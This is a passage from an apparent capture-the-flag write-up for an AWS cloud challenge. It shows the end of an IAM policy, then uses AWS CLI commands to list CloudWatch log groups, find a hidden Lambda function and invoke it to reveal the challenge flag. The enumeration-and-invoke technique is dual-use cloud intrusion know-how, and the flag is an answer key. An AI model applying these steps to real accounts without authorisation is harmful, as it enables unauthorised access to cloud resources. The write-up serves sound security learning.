                        "logs:*"
                    ],
                    "Effect": "Allow",
                    "Resource": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/*-webservice:*"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": false,
        "CreateDate": "2022-11-18T03:22:29Z"
    }
}
```

However, what stood out the `logs:Describe*` allow permissions, so perhaps we could find something useful within the logs?

### Finding the secret AWS lambda function within AWS Log Groups

```bash
$ aws logs describe-log-groups
{
    "logGroups": [
        ...
        {
            "logGroupName": "/aws/lambda/event-webservice",
            "creationTime": 1664456644866,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/event-webservice:*",
            "storedBytes": 3807231
        },
        {
            "logGroupName": "/aws/lambda/internal-secret-of-MeowOlympurr-webservice",
            "creationTime": 1664456602816,
            "metricFilterCount": 0,
            "arn": "arn:aws:logs:ap-southeast-1:908166204863:log-group:/aws/lambda/internal-secret-of-MeowOlympurr-webservice:*",
            "storedBytes": 18021
        }
    ]
}
```

We observe that there are 2 log groups that are of interest: 
* `/aws/lambda/event-webservice` 
* `/aws/lambda/internal-secret-of-MeowOlympurr-webservice`

Knowing that there was a AWS lambda function called `event-webservice` from the source code that we extracted earlier, could there be a `internal-secret-of-MeowOlympurr-webservice` AWS lambda function as well?

```bash
$ aws lambda invoke \
    --function-name internal-secret-of-MeowOlympurr-webservice \
    --invocation-type RequestResponse \
    /dev/stdout
{
    "statusCode": 200,
    "headers": {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*"
    },
    "body": "{\"Message\": \"STF22{LIveInTh3Me0wmen7_:3}\"}",
    "isBase64Encoded": false
}
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

Turns out simply triggering `internal-secret-of-MeowOlympurr-webservice` AWS lambda function without any payload gave us the flag.

## Flag
`STF22{LIveInTh3Me0wmen7_:3}`